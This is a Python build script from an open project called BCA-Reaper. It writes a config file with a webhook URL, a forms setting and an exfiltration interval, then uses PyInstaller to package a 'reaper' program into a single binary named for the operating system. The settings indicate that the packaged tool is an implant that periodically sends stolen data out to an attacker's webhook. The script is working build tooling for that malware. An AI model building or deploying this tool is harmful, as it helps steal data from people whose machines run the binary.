#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Reaper

__author__ = "EONRaider @ keybase.io/eonraider"

import argparse
from platform import system

import PyInstaller.__main__ as pyinstaller


def build(args: argparse.Namespace) -> None:
    """Set-up the arguments required by PyInstaller to build the Reaper
    binary."""

    config = {
        "webhook": args.webhook,
        "forms": args.forms,
        "exfil_time": args.exfil_time
    }

    with open(file="src/config.py", mode="w") as config_file:
        for key, value in config.items():
            value = value if not isinstance(value, str) else f"'{value}'"
            config_file.write(f"{key} = {value}\n")

    cmd = (
        "src/reaper.py", "--onefile",
        "--hidden-import", "config",
        "--name", f"{system().lower()}_reaper"
    )

    pyinstaller.run(cmd)


if __name__ == "__main__":
    from src.reaper import parse_cli

    build(parse_cli())
